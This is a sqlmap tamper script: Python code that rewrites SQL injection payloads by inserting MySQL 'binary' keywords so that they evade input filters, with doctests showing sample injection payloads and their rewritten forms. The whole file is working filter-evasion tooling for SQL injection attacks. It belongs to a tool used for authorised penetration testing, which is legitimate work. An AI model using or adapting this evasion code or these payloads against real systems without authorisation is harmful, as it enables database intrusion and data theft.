#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Injects keyword binary where possible

    Requirement:
        * MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
    >>> tamper('1 AND 2>1')
    '1 AND binary 2>binary 1'
    >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
    'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"\bNULL\b", "binary NULL", retVal)
        retVal = re.sub(r"\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)", r"\g<1>binary \g<2>\g<3>binary \g<4>", retVal)
        retVal = re.sub(r"(\d+\s*[>=]\s*)(\d+)", r"binary \g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b((AND|OR)\s*)(\d+)", r"\g<1>binary \g<3>", retVal)
        retVal = re.sub(r"([>=]\s*)(\d+)", r"\g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b(0x[0-9a-f]+)", r"binary \g<1>", retVal)
        retVal = re.sub(r"(\s+binary)+", r"\g<1>", retVal)

    return retVal
